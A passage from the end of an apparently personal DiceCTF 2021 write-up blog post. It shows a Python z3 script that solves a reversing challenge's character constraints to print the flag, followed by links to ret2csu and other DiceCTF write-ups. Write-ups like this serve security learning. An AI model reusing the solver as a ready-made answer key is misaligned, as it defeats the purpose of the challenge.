s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">265</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">250</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">18</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">75</span>)
s<span style="color:#f92672">.</span>add((a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">2</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">13</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">16</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">621</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">2</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">283</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">11</span>]) <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">14</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">13</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">106</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">297</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">156</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">13</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">85</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">17</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">160</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">36</span>)
s<span style="color:#f92672">.</span>add((a2[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">19</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">16</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">102</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">13</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">15</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">48</span>)
s<span style="color:#f92672">.</span>add((a2[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">3</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">4</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">29</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">109</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">361</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">19</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">296</span>)

s<span style="color:#f92672">.</span>check()
m <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>model()
flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> a2:
    flag <span style="color:#f92672">+=</span> chr(m[i]<span style="color:#f92672">.</span>as_long())
<span style="color:#66d9ef">print</span>(flag)
</code></pre></div><h2 id="references">References</h2>
<p><a href="https://ctf-wiki.org/pwn/linux/stackoverflow/medium-rop/#ret2csu">https://ctf-wiki.org/pwn/linux/stackoverflow/medium-rop/#ret2csu</a></p>
<p><a href="https://teamrocketist.github.io/2021/02/08/Pwn-DiceCTF2021-flippidy/">https://teamrocketist.github.io/2021/02/08/Pwn-DiceCTF2021-flippidy/</a></p>
<p><a href="https://www.josephsurin.me/posts/2021-02-08-dicectf-2021-garbled">https://www.josephsurin.me/posts/2021-02-08-dicectf-2021-garbled</a></p>
<p><a href="https://s3v3ru5.github.io/notes/DiceCTF2021#benaloh">https://s3v3ru5.github.io/notes/DiceCTF2021#benaloh</a></p>
<p><a href="https://priv.pub/posts/dicectf-2021/">https://priv.pub/posts/dicectf-2021/</a></p>
<p><a href="https://mystiz.hk/posts/2021-02-15-dicectf-1/">https://mystiz.hk/posts/2021-02-15-dicectf-1/</a></p>

      </div>
    </article>

    <hr />

    <div class="post-info">
      
      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="https://vergissmeinnichtz.github.io/categories/writeup/">WriteUp</a></span>
        <span class="tag"><a href="https://vergissmeinnichtz.github.io/categories/pwn/">Pwn</a></span>
        <span class="tag"><a href="https://vergissmeinnichtz.github.io/categories/crypto/">Crypto</a></span>
        
    </p>


      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
          <polyline points="14 2 14 8 20 8"></polyline>
          <line x1="16" y1="13" x2="8" y2="13"></line>
          <line x1="16" y1="17" x2="8" y2="17"></line>
          <polyline points="10 9 9 9 8 9"></polyline>
        </svg>
        4538 Words
      </p>

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        
          2021-02-08 08:00
        

         
          
        
      </p>
    </div>
      <hr />
      <div class="sharing-buttons">
        
<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fvergissmeinnichtz.github.io%2fposts%2f2021dicectf-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fvergissmeinnichtz.github.io%2fposts%2f2021dicectf-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=2021DiceCTF-WriteUp&amp;caption=2021DiceCTF-WriteUp&amp;canonicalUrl=https%3a%2f%2fvergissmeinnichtz.github.io%2fposts%2f2021dicectf-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="mailto:?subject=2021DiceCTF-WriteUp&amp;body=https%3a%2f%2fvergissmeinnichtz.github.io%2fposts%2f2021dicectf-writeup%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fvergissmeinnichtz.github.io%2fposts%2f2021dicectf-writeup%2f&amp;media=https%3a%2f%2fvergissmeinnichtz.github.io%2fposts%2f2021dicectf-writeup%2f;description=2021DiceCTF-WriteUp" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fvergissmeinnichtz.github.io%2fposts%2f2021dicectf-writeup%2f&amp;title=2021DiceCTF-WriteUp&amp;summary=2021DiceCTF-WriteUp&amp;source=https%3a%2f%2fvergissmeinnichtz.github.io%2fposts%2f2021dicectf-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fvergissmeinnichtz.github.io%2fposts%2f2021dicectf-writeup%2f&amp;resubmit=true&amp;title=2021DiceCTF-WriteUp" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fvergissmeinnichtz.github.io%2fposts%2f2021dicectf-writeup%2f;title=2021DiceCTF-WriteUp" target="_blank" rel="noopener" aria-label="" title="Share on xing">
  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="whatsapp://send?text=2021DiceCTF-WriteUp%20https%3a%2f%2fvergissmeinnichtz.github.io%2fposts%2f2021dicectf-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fvergissmeinnichtz.github.io%2fposts%2f2021dicectf-writeup%2f&amp;t=2021DiceCTF-WriteUp" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=2021DiceCTF-WriteUp&amp;url=https%3a%2f%2fvergissmeinnichtz.github.io%2fposts%2f2021dicectf-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
    </div>
  </div>
</a>

      </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>

        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="https://vergissmeinnichtz.github.io/posts/2021unionctf-writeup/">
                <span class="button__icon">←</span>
                <span class="button__text">2021UnionCTF-WriteUp</span>
              </a>
            </span>
          

          
            <span class="button next">
              <a href="https://vergissmeinnichtz.github.io/posts/helloworld/">
                <span class="button__text">Hello World</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
    


    

    

  </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2021</span>
            <span><a href="https://vergissmeinnichtz.github.io/">Anemone</a></span>
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span><span><a href="https://vergissmeinnichtz.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
          </div>
    </div>
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.af435e44374f1e99a669ea8cd5bb9a2fceed80588941a451bfddb66b86a67c9f40b0f417e9543a763f809aa7e9300d7b1d69bf99615810ba02ac70396d50fad5.js" integrity="sha512-r0NeRDdPHpmmaeqM1buaL87tgFiJQaRRv922a4amfJ9AsPQX6VQ6dj&#43;AmqfpMA17HWm/mWFYELoCrHA5bVD61Q=="></script>



    </body>
</html>
